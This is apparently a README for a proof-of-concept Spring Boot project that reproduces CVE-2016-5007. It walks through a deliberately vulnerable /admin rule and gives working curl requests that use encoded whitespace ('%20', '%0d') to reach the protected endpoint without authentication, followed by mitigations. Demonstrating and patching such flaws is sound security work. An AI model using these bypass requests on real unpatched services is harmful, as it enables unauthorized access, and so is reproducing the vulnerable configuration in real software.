CVE‑2016‑5007 Proof‑of‑Concept
Overview

This project demonstrates CVE‑2016‑5007
, a security flaw in older versions of Spring Framework and Spring Security.
In Spring MVC 3.2.x and 4.0–4.2.x, the AntPathMatcher trims leading and trailing whitespace when tokenising URL segments.
Spring Security’s URL matcher does not do this trimming. When an attacker inserts encoded whitespace (such as a space or carriage return) into a request path, the security rule no longer matches but the MVC controller still receives the request. For example, a request to /admin%20 bypasses /admin/** security rules and is dispatched to the /admin controller
spring.io
. Versions of Spring Framework up to 4.2.x and Spring Security 4.1.0 and earlier are affected.

Project contents

This proof‑of‑concept is a minimal Spring Boot 1.0 application that reproduces the vulnerability:

pom.xml – Uses Spring Boot 1.0.0.RELEASE to pull in Spring Framework 4.0.3.RELEASE and adds Spring Security 4.0.0.RELEASE explicitly. You can override spring.version to use your own patched builds.

Example.java – The entry point for the application. It uses @Configuration, @EnableAutoConfiguration and @ComponentScan instead of @SpringBootApplication because that annotation was introduced later.

HelloController.java – Exposes two endpoints: /public returns a public message, and /admin returns an “admin endpoint” message.

SecurityConfig.java – Configures in‑memory users (user and admin), enables HTTP Basic authentication, and restricts /admin/** to users with the ADMIN role. All other requests are permitted.

Prerequisites

To build and run the example you need:

Java 8 (JDK 1.8) – The project targets Java 8 because Spring Framework 4.0.x was designed for that version.

Maven 3.x – To build and run the project.

Building and running

Extract the ZIP or clone the repository and open a terminal in the project root:

cd spring-cve-2016-5007-poc-new


To run the application with Maven (recommended for development):

mvn spring-boot:run


Alternatively, build a runnable JAR and execute it manually:

mvn clean package
java -jar target/spring-cve-2016-5007-poc-new-1.0-SNAPSHOT.jar


The application listens on http://localhost:8080.

Demonstrating the vulnerability

The /admin endpoint is secured by antMatchers("/admin/**").hasRole("ADMIN"). Without credentials you should receive a 401/403 response. However, because of the path‑matching inconsistency, inserting whitespace into the path bypasses the rule:

Normal access:

curl -i http://localhost:8080/admin


The response status should be 401 or 403 since no credentials are provided.

Exploit with trailing space:

# trailing space encoded as %20
curl -s http://localhost:8080/admin%20


Spring Security’s URL matcher does not recognise /admin%20 as matching /admin/**, so the request is allowed through. Spring MVC trims the %20 and dispatches to the /admin controller
spring.io
, returning the protected content without authentication.

Exploit with carriage return:

# encoded carriage return (%0d) before 'admin'
curl -s http://localhost:8080/%0dadmin


As above, the encoded whitespace bypasses the security rule and returns the “admin endpoint” message.

These requests demonstrate CVE‑2016‑5007: by inserting whitespace into the URL, an attacker can access endpoints that should be protected by URL‑based security rules.

Mitigations

The vulnerability is resolved in later versions of Spring. To protect your applications you should:

Upgrade Spring Framework and Spring Security: Spring Framework 4.3.0 and later set trimTokens to false by default, aligning Spring MVC with Spring Security
spring.io
. Spring Security 4.1.1 introduced a MvcRequestMatcher which delegates URL matching to Spring MVC
spring.io
.

Use MvcRequestMatcher instead of AntPathRequestMatcher: In affected versions, you can switch from antMatchers() to mvcMatchers() in your security configuration. This delegates matching to Spring MVC and avoids the inconsistency
spring.io
.

Configure a custom AntPathMatcher: As a workaround in 4.0.x and 4.1.x, define a PathMatcher bean with setTrimTokens(false) and register it via MVC configuration
terasolunaorg.github.io
. This makes Spring MVC treat whitespace the same way Spring Security does.

Apply patched modules: If you cannot upgrade, you can recompile Spring Framework modules with the default trimTokens set to false and override the spring.version property in your pom.xml to use your patched versions across the project.

Notes on custom versions

This project uses the standard Spring Boot 1.0 parent which sets spring.version to 4.0.3.RELEASE through its dependency management
repo1.maven.org
. All Spring modules depend on that property
repo1.maven.org
. If you build your own patched version of Spring Framework (e.g., 4.0.0.RELEASE‑tuxcare.101), you can override the <spring.version> property in the <properties> section of your POM or add explicit versions in a <dependencyManagement> block to ensure all modules use your build. See the accompanying discussion for details.

Disclaimer

This project is provided for educational purposes to illustrate CVE‑2016‑5007. Do not deploy this code to production systems. Always apply vendor patches and upgrades to protect your applications.